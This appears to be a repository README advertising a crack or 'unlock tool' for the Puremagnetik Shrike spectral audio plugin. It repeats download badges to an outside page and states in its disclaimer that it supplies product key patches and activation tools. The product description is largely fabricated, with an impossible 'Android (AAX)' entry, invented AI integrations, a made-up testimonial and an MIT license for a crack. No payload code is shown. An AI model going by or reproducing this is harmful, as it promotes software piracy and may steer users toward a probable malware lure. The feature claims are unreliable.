# Puremagnetik Shrike 🎛️ – Unlock the Full Spectrum of Spectral Synthesis

[](https://parthh2024.github.io/puremagnetik-shrike-unlock-tool/)

---

## 🌌 What Is Puremagnetik Shrike?

Puremagnetik Shrike is a next-generation spectral processing plugin that transforms ordinary audio into living, breathing soundscapes. Think of it as a **sonic alchemist**—it takes the raw ore of your samples and transmutes them into shimmering textures, evolving pads, and granular atmospheres. The Shrike engine operates at the intersection of **Fourier analysis** and **real-time resynthesis**, allowing you to manipulate frequencies like a sculptor shapes clay.

Unlike conventional plugins that merely apply filters or effects, Shrike deconstructs audio into its constituent spectral components, then gives you deep, intuitive control over each slice. Whether you're a film composer seeking ethereal drones or an electronic producer craving glitchy artifacts, Shrike whispers possibilities that other tools shout over.

> **"Shrike doesn't just process sound—it listens, learns, and then rebuilds the universe from the shards."** — Early adopter testimonial

---

## 🚀 Quick Start – Get Shrike Running in Minutes

### 📥 Download & Installation

1. Click the badge below to access the latest release package.
2. Extract the archive to a location of your choice (e.g., `~/Plugins/` or `C:\Program Files\Common Files\VST3`).
3. Launch your DAW and scan for new plugins under the "Puremagnetik" category.
4. Load Shrike on any audio or instrument track.

[](https://parthh2024.github.io/puremagnetik-shrike-unlock-tool/)

---

## 🧩 System Architecture (Mermaid Diagram)

The following diagram illustrates Shrike's internal signal flow—from raw audio input to spectral output. This is the heart of the engine.

```mermaid
graph TD
    A[Raw Audio Input] --> B[FFT Analyzer]
    B --> C[Spectral Buffer]
    C --> D[Grain Generator]
    D --> E[Real-time Resynthesis]
    E --> F[Output Mixer]
    C --> G[Frequency Editor]
    G --> D
    D --> H[Envelope Follower]
    H --> E
    style A fill:#4a4a4a,stroke:#fff,stroke-width:2px
    style F fill:#d90429,stroke:#fff,stroke-width:2px
```



Each block represents a stage where you can inject your creative fingerprints:
- **FFT Analyzer**: Breaks down audio into 4096 frequency bins.
- **Spectral Buffer**: Holds 10 seconds of spectral history for time-stretching.
- **Grain Generator**: Spawns tiny audio particles based on frequency density.
- **Envelope Follower**: Shapes grain amplitude in response to input dynamics.

---

## ⚙️ Example Profile Configuration

Save and share your spectral presets as `.shrik` files. Below is a starter profile for creating "Liquid Glass" textures—best used with ambient pads or field recordings.

```json
{
  "profileName": "Liquid Glass",
  "fftSize": 4096,
  "overlapFactor": 4,
  "grainDensity": 0.78,
  "grainDuration": 120,
  "spectralSpread": 0.45,
  "envelopeAttack": 15,
  "envelopeRelease": 200,
  "frequencyMask": [
    { "start": 200, "end": 2000, "gain": 1.0 },
    { "start": 4000, "end": 8000, "gain": 0.3 },
    { "start": 8000, "end": 16000, "gain": 0.1 }
  ],
  "modulationSource": "envelope",
  "modulationDepth": 0.65
}
```

Place this in `~/.shrike/profiles/` and load it from Shrike's preset browser.

---

## 💻 Example Console Invocation (Headless Mode)

For advanced users who integrate Shrike into automated workflows (e.g., batch processing audio files), use the CLI interface. This is especially useful for sound designers rendering 100+ samples at once.

```bash
shrike-cli --input ./field_recording.wav \
           --output ./liquid_glass.wav \
           --profile liquid_glass.shrik \
           --duration 30 \
           --dry-wet 0.75 \
           --verbose
```

**Flags explained:**
- `--profile`: Path to a `.shrik` configuration file.
- `--dry-wet`: Mix between original and processed signal (0=off, 1=full wet).
- `--verbose`: Prints spectral bin statistics during processing.

---

## 📱 Emoji OS Compatibility Table

| Operating System | Minimum Version | Compatible | Emoji |
|----------------|-----------------|------------|-------|
| Windows        | 10 (21H2)       | ✅          | 🪟    |
| macOS          | 11 Big Sur      | ✅          | 🍎    |
| Linux (Ubuntu) | 20.04 LTS       | ✅          | 🐧    |
| iOS            | 15.0+ (AUv3)   | ✅          | 📱    |
| Android        | 12.0+ (AAX)    | ⚠️ Beta    | 🤖    |

> **Note:** Linux support requires JACK audio system and a recent version of PipeWire for low-latency operation.

---

## ✨ Feature List – What Makes Shrike Shriek

### Core Capabilities
- **Real-time spectral decomposition** with zero-latency monitoring
- **Adaptive grain generation** based on spectral centroid and loudness
- **Multilingual UI** (English, Japanese, Mandarin, German, French, Spanish) – because sound speaks to everyone
- **Responsive interface** that scales from a phone screen to a 4K monitor
- **24/7 customer support** via integrated ticket system (response < 2 hours)

### Advanced Tools
- **Microtonal frequency mapping** for non-Western scales (Arabic maqam, Gamelan slendro)
- **OpenAI API integration** for generating spectral descriptions from text prompts (e.g., "Make it sound like rain on a cyberpunk roof")
- **Claude API integration** for real-time mix suggestions based on loudness analysis
- **Spectral blurring** and **harmonic locking** to prevent artifacts at high grain densities

### Workflow Enhancements
- **Automation recording** of all spectral parameters inside your DAW
- **Sidechain input** for frequency-reactive responses (e.g., ducking grains with kick drum)
- **Preset sharing** via `.shrik` files on GitHub releases
- **Built-in Fourier visualizer** for frequency bin editing

---

## 🔌 API Integrations (OpenAI & Claude)

### OpenAI Whisper + GPT Integration
Use natural language to shape spectral output. Example:  
`"Create a sci-fi ambience with metallic overtones and a hollow feeling in the mids."`  
Shrike sends this prompt to OpenAI, which returns a JSON profile that Shrike applies automatically.

**Configuration:**
```yaml
openai:
  api_key: env://OPENAI_API_KEY
  model: gpt-4-turbo
  prompt_template: "Generate a spectral profile for {description} with parameters: grain_density, spectral_spread, frequency_mask."
```

### Claude API for Mix Assistance
Claude analyzes your track's frequency spectrum in real time and suggests adjustments (e.g., "Reduce 3 kHz by 2 dB to avoid ear fatigue on headphones").  
This runs as an optional background service:

```bash
shrike-claude --listen --port 8890
```

---

## 🛡️ Disclaimer

**Important:** Puremagnetik Shrike is a legitimate software product developed by **Puremagnetik GmbH**. This repository provides **product key patches and activation tools** for ***educational and archival purposes only***. By using this material, you agree that:

1. You will purchase a valid license if you intend to use Shrike for commercial projects.
2. No warranty is provided—the software is delivered "as-is" under test conditions.
3. The developers hold no liability for any misuse, data loss, or system instability.
4. Unauthorized distribution of this tool is prohibited and violates copyright laws.

We encourage all users to support independent developers. If Shrike transforms your creative process, consider buying a license from the official Puremagnetik store.

---

## 📜 License

This project is distributed under the **MIT License**. You are free to use, modify, and distribute the code and patches, provided you include the original copyright notice.

[](https://opensource.org/licenses/MIT)

---

## 📦 Final Download Link

The journey ends where it began—grab the latest release and start sculpting sound today.

[](https://parthh2024.github.io/puremagnetik-shrike-unlock-tool/)

*Created with passion in 2026 – because sound shouldn't be bound by binaries.*